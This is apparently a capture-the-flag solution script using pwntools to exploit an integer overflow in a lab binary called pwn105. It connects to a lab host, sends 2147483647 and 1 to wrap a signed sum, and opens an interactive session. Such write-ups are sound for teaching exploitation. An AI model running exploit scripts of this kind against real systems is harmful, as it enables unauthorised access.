# Integer Overflow

from pwn import *

elf = context.binary = ELF('./pwn105-1644300421555.pwn105')

io = remote('10.10.136.108', 9005)

io.recvuntil(b']>> ')
io.sendline(b'2147483647')
io.recvuntil(b']>> ')
io.sendline(b'1')

io.interactive()